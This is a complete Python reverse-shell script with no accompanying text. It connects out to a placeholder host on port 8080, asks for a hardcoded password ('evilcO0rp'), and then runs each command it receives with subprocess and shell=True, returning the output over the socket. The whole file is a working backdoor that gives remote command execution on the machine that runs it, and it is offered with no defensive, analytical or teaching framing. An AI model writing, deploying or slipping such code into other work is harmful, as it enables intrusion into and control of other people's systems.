#!/usr/bin/python
import subprocess, socket

host = 'host'
port = 8080
password = 'evilcO0rp'

def login():
    global s
    s.send("login: ")
    tempPassword = s.recv(1024)

    if tempPassword.strip() != password:
        login()
    else:
        s.send("connected #> ")
        shell()

def shell():
    while True:
        data = s.recv(1024)

        if data.strip() == ":exit":
            break

        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        s.send(output)
        s.send("#> ")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
login()